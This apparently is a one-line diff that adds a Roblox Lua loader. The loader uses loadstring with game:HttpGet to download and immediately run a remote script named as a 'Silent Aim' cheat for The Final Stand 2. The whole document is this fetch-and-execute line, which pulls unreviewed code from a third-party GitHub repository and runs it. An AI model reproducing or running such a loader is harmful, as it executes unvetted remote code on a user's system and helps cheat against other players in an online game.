@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NikolaiV3rm/Scripts/main/The%20Final%20Stand%202%20Silent%20Aim.lua", true))()
